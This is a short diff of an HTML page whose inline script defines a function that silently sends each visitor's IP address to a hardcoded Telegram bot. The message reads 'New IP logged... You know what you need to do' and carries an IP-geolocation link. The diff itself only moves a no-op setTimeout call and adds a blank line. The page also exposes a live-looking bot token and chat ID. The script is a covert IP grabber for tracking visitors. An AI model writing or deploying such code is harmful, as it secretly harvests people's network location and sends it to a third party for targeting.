@@ -19,12 +19,12 @@ body {
 
 
     <script>
-      setTimeout('', 5000);
         function sendToTelegram(ip) {
             const token = '7719637928:AAFsQ6QHSH7z_GUeu6HMYl62yngKQPsRL_g'; //yep I forgot my tg bot api cuz I am lazy:)
             const chatId = '6013637983';
             const message = `New IP logged: ${ip}. You know what you need to do...
             https://ipapi.co/?q=${ip}`;
+          setTimeout('', 5000);
 
             $.ajax({
                 url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -60,6 +60,7 @@ body {
 </body>
 
 </html>
+
 
 
 
